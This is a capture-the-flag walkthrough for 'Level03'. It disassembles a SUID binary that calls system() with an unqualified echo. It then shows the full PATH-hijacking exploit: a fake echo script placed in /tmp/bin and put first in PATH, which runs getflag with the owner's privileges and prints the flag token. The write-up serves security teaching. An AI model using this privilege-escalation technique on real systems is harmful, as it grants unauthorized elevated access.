# Level03

<!-- not here -->
<!-- ## HACKING THE ART OF EXPLOITATION
[the art of exploitation](https://repo.zenk-security.com/Magazine%20E-book/Hacking-%20The%20Art%20of%20Exploitation%20(2nd%20ed.%202008)%20-%20Erickson.pdf) -->

```bash
ls -la
# ouput: finally there is a binary file here, we gonna do some exploit 🤩
-rwsr-sr-x 1 flag03  level03 8627 Mar  5  2016 level03
# run strings level03, you can use gdb or objdump
```
This file has a strange permissions the one that we don't see often is `s` SUID<br/>
SUID or Set Owner User ID is a permission bit flag that applies to executables.<br/>
SUID allows an alternate user to run an executable with the same permissions<br/>
as the owner of the file instead of the permissions of the alternate user.<br/>

Using objdump<br/>
```bash
# d, --disassemble Display assembler contents of executable sections
objdump -d level03 -M intel | grep -A 26 "main>:"
# Output:
080484a4 <main>:
 80484a4:	55                   	push   ebp
 80484a5:	89 e5                	mov    ebp,esp
 80484a7:	83 e4 f0             	and    esp,0xfffffff0
 80484aa:	83 ec 20             	sub    esp,0x20
 80484ad:	e8 ee fe ff ff       	call   80483a0 <getegid@plt>
 80484b2:	89 44 24 18          	mov    DWORD PTR [esp+0x18],eax
 80484b6:	e8 d5 fe ff ff       	call   8048390 <geteuid@plt>
 80484bb:	89 44 24 1c          	mov    DWORD PTR [esp+0x1c],eax
 80484bf:	8b 44 24 18          	mov    eax,DWORD PTR [esp+0x18]
 80484c3:	89 44 24 08          	mov    DWORD PTR [esp+0x8],eax
 80484c7:	8b 44 24 18          	mov    eax,DWORD PTR [esp+0x18]
 80484cb:	89 44 24 04          	mov    DWORD PTR [esp+0x4],eax
 80484cf:	8b 44 24 18          	mov    eax,DWORD PTR [esp+0x18]
 80484d3:	89 04 24             	mov    DWORD PTR [esp],eax
 80484d6:	e8 05 ff ff ff       	call   80483e0 <setresgid@plt>
 80484db:	8b 44 24 1c          	mov    eax,DWORD PTR [esp+0x1c]
 80484df:	89 44 24 08          	mov    DWORD PTR [esp+0x8],eax
 80484e3:	8b 44 24 1c          	mov    eax,DWORD PTR [esp+0x1c]
 80484e7:	89 44 24 04          	mov    DWORD PTR [esp+0x4],eax
 80484eb:	8b 44 24 1c          	mov    eax,DWORD PTR [esp+0x1c]
 80484ef:	89 04 24             	mov    DWORD PTR [esp],eax
 80484f2:	e8 89 fe ff ff       	call   8048380 <setresuid@plt>
 80484f7:	c7 04 24 e0 85 04 08 	mov    DWORD PTR [esp],0x80485e0
 80484fe:	e8 ad fe ff ff       	call   80483b0 <system@plt>
 8048503:	c9                   	leave
 8048504:	c3                   	ret
```

As you can see, you can translate this assembly code to c code source<br/>

## source code
```c
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <stdio.h>

int main(int argc, char **argv, char **envp)
{
  gid_t gid;
  uid_t uid;
  gid = getegid();
  uid = geteuid();

  setresgid(gid, gid, gid);
  setresuid(uid, uid, uid);

  // this string obtains with strings level03
  system("/usr/bin/env echo Exploit me");

```
the parts that are matter to us are the call to getegid, geteuid, setresgid, setresuid and system
the echo command runs without the full path, we can override this behavior by using our echo command<br/>
this is part `/usr/bin/env echo` is an instruction to set the PATH (as well as all the other NAME+VALUE pairs), and then run echo using the first directory in the PATH that contains the echo executable.<br/>

```bash
mkdir -p /tmp/bin
echo "getflag" > /tmp/bin/echo
chmod 777 /tmp/bin/echo
export PATH=/tmp/bin:$PATH
./level03
Check flag.Here is your token : qi0maab88jeaj46qoumi7maus
```